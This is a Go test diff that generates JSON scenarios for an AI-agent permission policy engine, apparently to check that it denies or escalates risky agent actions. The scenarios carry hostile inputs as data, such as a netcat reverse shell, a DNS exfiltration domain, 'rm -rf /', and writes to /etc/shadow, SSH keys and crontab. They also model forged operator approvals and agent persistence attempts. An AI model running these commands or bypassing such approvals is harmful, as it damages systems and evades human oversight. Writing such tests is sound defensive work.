@@ -383,3 +383,269 @@ func TestGenerateCorpus2(t *testing.T) {
 	}
 	t.Logf("generated %d more scenarios", len(out))
 }
+
+func TestGenerateCorpus3(t *testing.T) {
+	if os.Getenv("GEN") == "" {
+		t.Skip("GEN=1 to regenerate")
+	}
+	var out []map[string]any
+	std := map[string]any{"default": "deny", "rules": []policy.Rule{
+		{ID: "allow-gh", Effect: "allow", Sel: policy.Selector{
+			Types:     []string{"http.request"},
+			Resources: []string{"https://api.github.com*"}}},
+		{ID: "esc-shell", Effect: "escalate", Sel: policy.Selector{
+			Types: []string{"shell.exec"}}},
+		{ID: "allow-tmp", Effect: "allow", Sel: policy.Selector{
+			Types: []string{"fs.read"}, Resources: []string{"/tmp/*"}}},
+		{ID: "esc-pkg", Effect: "escalate", Sel: policy.Selector{
+			Types: []string{"pkg.install"}}},
+		{ID: "esc-deploy", Effect: "escalate", Sel: policy.Selector{
+			Types: []string{"ci.deploy"}}},
+	}}
+	sc := func(id, class, tier, title string, policy any,
+		tokens []map[string]any, req map[string]any,
+		expect, reason string) {
+		m := map[string]any{"id": id, "class": class, "tier": tier,
+			"title": title, "policy": policy, "request": req,
+			"expect": map[string]string{"outcome": expect, "reason_sub": reason}}
+		if tokens != nil {
+			m["tokens"] = tokens
+		}
+		out = append(out, m)
+	}
+	rq := func(typ, res string, extra map[string]any) map[string]any {
+		m := map[string]any{"actor": "agent1", "type": typ,
+			"resource": res, "sig": "valid", "canonicalize": true, "env": "dev"}
+		for k, v := range extra {
+			m[k] = v
+		}
+		return m
+	}
+	tok := func(id, subj string, scope map[string]any,
+		cav []map[string]any, delegate bool) map[string]any {
+		return map[string]any{"id": id, "subject": subj, "scope": scope,
+			"caveats": cav, "delegate": delegate}
+	}
+	tmpRead := map[string]any{"action_types": []string{"fs.read"},
+		"resources": []string{"/tmp/*"}, "envs": []string{"dev"}}
+
+	// token tampering — post-issue mutation must invalidate signature
+	sc("sc-tm-001", "tcb", "t1", "scope widened post-issue", std,
+		[]map[string]any{tok("t1", "agent1", tmpRead, nil, false)},
+		rq("fs.read", "/etc/shadow", map[string]any{"token": "t1",
+			"token_mangle": "widen_scope"}), "deny", "")
+	sc("sc-tm-002", "tcb", "t1", "epoch bumped post-issue", std,
+		[]map[string]any{tok("t1", "agent1", tmpRead, nil, false)},
+		rq("fs.read", "/tmp/x", map[string]any{"token": "t1",
+			"token_mangle": "bump_epoch"}), "deny", "")
+
+	// privileged action vocabulary — each must hit default-deny or
+	// escalate, never silent allow
+	sc("sc-pv-001", "scope_boundary", "t0", "cred.inject denied", std, nil,
+		rq("cred.inject", "aws_secret", nil), "deny", "")
+	sc("sc-pv-002", "scope_boundary", "t0", "proc.spawn denied", std, nil,
+		rq("proc.spawn", "nc -e /bin/sh x 4444", nil), "deny", "")
+	sc("sc-pv-003", "scope_boundary", "t0", "ipc.send denied", std, nil,
+		rq("ipc.send", "channel-x: secrets", nil), "deny", "")
+	sc("sc-pv-004", "scope_boundary", "t0", "agent.message denied", std, nil,
+		rq("agent.message", "agent2: share creds", nil), "deny", "")
+	sc("sc-pv-005", "egress", "t1", "dns exfil domain denied", std, nil,
+		rq("net.dns", "exfil.evil.com", nil), "deny", "")
+	sc("sc-pv-006", "scope_boundary", "t0", "pkg.install escalates", std, nil,
+		rq("pkg.install", "requests", nil), "escalate", "")
+	sc("sc-pv-007", "scope_boundary", "t0", "ci.deploy escalates", std, nil,
+		rq("ci.deploy", "prod", nil), "escalate", "")
+	sc("sc-pv-008", "scope_boundary", "t1", "git.force_push denied", std, nil,
+		rq("git.force_push", "main", nil), "deny", "")
+	sc("sc-pv-009", "scope_boundary", "t1", "mcp.call denied", std, nil,
+		rq("mcp.call", "shell:run", nil), "deny", "")
+
+	// escalation ordering: deny must dominate escalate when both match
+	order := map[string]any{"default": "allow", "rules": []policy.Rule{
+		{ID: "esc", Effect: "escalate", Sel: policy.Selector{
+			Types: []string{"fs.write"}}},
+		{ID: "deny-shadow", Effect: "deny", Priority: 5,
+			Sel: policy.Selector{Types: []string{"fs.write"},
+				Resources: []string{"/etc/shadow"}}},
+	}}
+	sc("sc-or-001", "scope_boundary", "t1",
+		"deny dominates escalate (shadow file)", order, nil,
+		rq("fs.write", "/etc/shadow", nil), "deny", "")
+	sc("sc-or-002", "scope_boundary", "t1",
+		"escalate where deny doesn't reach", order, nil,
+		rq("fs.write", "/tmp/x", nil), "escalate", "")
+
+	// persistence probes: reuse patterns an agent would try
+	sc("sc-ps-001", "persistence", "t1",
+		"write into ssh/authorized_keys path", std, nil,
+		rq("fs.write", "/root/.ssh/authorized_keys", nil), "deny", "")
+	sc("sc-ps-002", "persistence", "t1", "write crontab", std, nil,
+		rq("fs.write", "/var/spool/cron/root", nil), "deny", "")
+	sc("sc-ps-003", "persistence", "t1", "write shell rc", std, nil,
+		rq("fs.write", "/root/.bashrc", nil), "deny", "")
+
+	for _, m := range out {
+		b, _ := json.MarshalIndent(m, "", "  ")
+		os.WriteFile(filepath.Join(scenariosDir,
+			m["id"].(string)+".json"), b, 0o644)
+	}
+	t.Logf("generated %d more scenarios", len(out))
+}
+
+func TestGenerateCorpus4(t *testing.T) {
+	eg := map[string]any{"default": "deny", "rules": []policy.Rule{
+		{ID: "allow-gh", Effect: "allow", Sel: policy.Selector{
+			Types:     []string{"http.request"},
+			Resources: []string{"https://api.github.com*"}}},
+	}}
+	if os.Getenv("GEN") == "" {
+		t.Skip("GEN=1 to regenerate")
+	}
+	var out []map[string]any
+	// policy where shell.exec escalates → approval path exercised
+	std := map[string]any{"default": "deny", "rules": []policy.Rule{
+		{ID: "esc-shell", Effect: "escalate", Sel: policy.Selector{
+			Types: []string{"shell.exec"}}},
+		{ID: "reqcap", Effect: "require_capability", Sel: policy.Selector{
+			Types: []string{"fs.read"}}},
+	}}
+	sc := func(id, class, tier, title string, policy any,
+		tokens []map[string]any, req map[string]any,
+		expect, reason string) {
+		m := map[string]any{"id": id, "class": class, "tier": tier,
+			"title": title, "policy": policy, "request": req,
+			"expect": map[string]string{"outcome": expect, "reason_sub": reason}}
+		if tokens != nil {
+			m["tokens"] = tokens
+		}
+		out = append(out, m)
+	}
+	rq := func(typ, res string, extra map[string]any) map[string]any {
+		m := map[string]any{"actor": "agent1", "type": typ,
+			"resource": res, "sig": "valid", "canonicalize": true, "env": "dev"}
+		for k, v := range extra {
+			m[k] = v
+		}
+		return m
+	}
+	ap := func(id, bind, resolve string, forged bool) map[string]any {
+		return map[string]any{"id": id, "bind": bind,
+			"resolve": resolve, "forged": forged}
+	}
+
+	// approval manipulation (escalate → operator grant → re-eval)
+	sc("sc-am-001", "approval_manipulation", "t1",
+		"valid approval redeems escalation", std, nil,
+		rq("shell.exec", "rm -rf /tmp/x", map[string]any{
+			"approval": ap("a1", "self", "approve", false)}), "allow", "")
+	sc("sc-am-002", "approval_manipulation", "t1",
+		"approval bound to different action", std, nil,
+		rq("shell.exec", "rm -rf /", map[string]any{
+			"approval": ap("a2", "other", "approve", false)}), "escalate", "")
+	sc("sc-am-003", "approval_manipulation", "t1",
+		"forged operator signature", std, nil,
+		rq("shell.exec", "rm -rf /", map[string]any{
+			"approval": ap("a3", "self", "approve", true)}), "escalate", "")
+	sc("sc-am-004", "approval_manipulation", "t1",
+		"unresolved (pending) approval", std, nil,
+		rq("shell.exec", "rm -rf /", map[string]any{
+			"approval": ap("a4", "self", "none", false)}), "escalate", "")
+	sc("sc-am-005", "approval_manipulation", "t1",
+		"operator-denied approval", std, nil,
+		rq("shell.exec", "rm -rf /", map[string]any{
+			"approval": ap("a5", "self", "deny", false)}), "escalate", "")
+	sc("sc-am-006", "approval_manipulation", "t1",
+		"unknown approval id", std, nil,
+		rq("shell.exec", "rm -rf /", map[string]any{
+			"approval": map[string]any{"id": "nonexistent",
+				"bind": "self", "resolve": "none"}}), "escalate", "")
+
+	// require_capability effect interplay
+	tmpRead := map[string]any{"action_types": []string{"fs.read"},
+		"resources": []string{"/tmp/*"}, "envs": []string{"dev"}}
+	sc("sc-rc-001", "authority", "t1",
+		"require_capability: tokenless escalates", std, nil,
+		rq("fs.read", "/tmp/x", nil), "escalate", "capability")
+	sc("sc-rc-002", "authority", "t1",
+		"require_capability: valid token allows", std,
+		[]map[string]any{{"id": "t1", "subject": "agent1", "scope": tmpRead}},
+		rq("fs.read", "/tmp/x", map[string]any{"token": "t1"}), "allow", "")
+	sc("sc-rc-003", "authority", "t1",
+		"require_capability: wrong-scope token still escalates→deny chain", std,
+		[]map[string]any{{"id": "t1", "subject": "agent1", "scope": map[string]any{
+			"action_types": []string{"fs.read"},
+			"resources":    []string{"/tmp/ok/*"}, "envs": []string{"dev"}}}},
+		rq("fs.read", "/tmp/secret", map[string]any{"token": "t1"}), "deny", "")
+
+	// boundary freshness
+	sc("sc-fr-001", "stale_authorization", "t1",
+		"59s old — inside window", std, nil,
+		rq("shell.exec", "ls", map[string]any{"issued_age_s": 59}), "escalate", "")
+	sc("sc-fr-002", "stale_authorization", "t1",
+		"61s old — outside window", std, nil,
+		rq("shell.exec", "ls", map[string]any{"issued_age_s": 61}), "deny", "")
+
+	// more egress spellings
+	sc("sc-eg-020", "egress", "t1", "scheme-relative URL", eg, nil,
+		rq("http.request", "//api.github.com/x", nil), "deny", "")
+	sc("sc-eg-021", "egress", "t1", "ftp scheme", eg, nil,
+		rq("http.request", "ftp://api.github.com/x", nil), "deny", "")
+	sc("sc-eg-022", "egress", "t1", "empty path canonicalizes", eg, nil,
+		rq("http.request", "https://api.github.com", nil), "allow", "")
+	sc("sc-eg-023", "egress", "t1", "fragment stripped or kept honest", eg, nil,
+		rq("http.request", "https://api.github.com/x#frag", nil), "allow", "")
+	sc("sc-eg-024", "egress", "t1", "encoded traversal in URL path", eg, nil,
+		rq("http.request", "https://api.github.com/%2e%2e/secret", nil), "allow", "")
+
+	for _, m := range out {
+		b, _ := json.MarshalIndent(m, "", "  ")
+		os.WriteFile(filepath.Join(scenariosDir,
+			m["id"].(string)+".json"), b, 0o644)
+	}
+	t.Logf("generated %d more scenarios", len(out))
+}
+
+func TestGenerateCorpus5(t *testing.T) {
+	if os.Getenv("GEN") == "" {
+		t.Skip("GEN=1 to regenerate")
+	}
+	var out []map[string]any
+	std := map[string]any{"default": "deny", "rules": []policy.Rule{
+		{ID: "allow-gh", Effect: "allow", Sel: policy.Selector{
+			Types:     []string{"http.request"},
+			Resources: []string{"https://api.github.com*"}}},
+		{ID: "allow-tmp", Effect: "allow", Sel: policy.Selector{
+			Types: []string{"fs.read"}, Resources: []string{"/tmp/*"}}},
+	}}
+	sc := func(id, class, tier, title string, req map[string]any,
+		expect string) {
+		out = append(out, map[string]any{"id": id, "class": class,
+			"tier": tier, "title": title, "policy": std, "request": req,
+			"expect": map[string]string{"outcome": expect}})
+	}
+	rq := func(typ, res string, extra map[string]any) map[string]any {
+		m := map[string]any{"actor": "agent1", "type": typ,
+			"resource": res, "sig": "valid", "canonicalize": true, "env": "dev"}
+		for k, v := range extra {
+			m[k] = v
+		}
+		return m
+	}
+	sc("sc-eg-025", "egress", "t1", "percent-encoded host char",
+		rq("http.request", "https://%61pi.github.com/x", nil), "deny")
+	sc("sc-eg-026", "egress", "t1", "double-slash path",
+		rq("http.request", "https://api.github.com//x", nil), "allow")
+	sc("sc-fs-010", "filesystem", "t1", "symlink-ish dotdot in middle stays",
+		rq("fs.read", "/tmp/a/../../etc/passwd", nil), "deny")
+	sc("sc-fs-011", "filesystem", "t1", "home tilde rejected (untrusted env)",
+		rq("fs.read", "~/secret", map[string]any{"canonicalize": false}), "deny")
+	sc("sc-rp-002", "replay", "t1", "allow-then-replay denied",
+		rq("http.request", "https://api.github.com/x",
+			map[string]any{"send_twice": true}), "deny")
+	for _, m := range out {
+		b, _ := json.MarshalIndent(m, "", "  ")
+		os.WriteFile(filepath.Join(scenariosDir,
+			m["id"].(string)+".json"), b, 0o644)
+	}
+	t.Logf("generated %d more scenarios", len(out))
+}
